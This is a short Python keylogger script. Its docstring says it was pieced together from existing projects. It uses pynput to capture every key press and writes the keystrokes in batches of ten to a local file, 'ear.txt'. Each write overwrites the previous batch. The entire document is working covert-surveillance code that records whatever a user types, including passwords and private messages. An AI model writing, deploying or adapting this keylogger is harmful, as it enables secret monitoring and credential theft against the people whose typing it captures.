'''The following python script was pieced together with research from different existing projects.
There are many python keyloggers that already exist and a lot use similar functions for user inputs such as
"on_press/on_release"
'''

from pynput import keyboard


def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)


count = 0
keys = []


def on_press(key):
    global keys, count
    key_name = get_key_name(key)

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("ear.txt", "w+") as f:
        for key in keys:
            f.write(str(key))
        f.close()


def on_release(key):
    key_name = get_key_name(key)


def startKeylogger():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
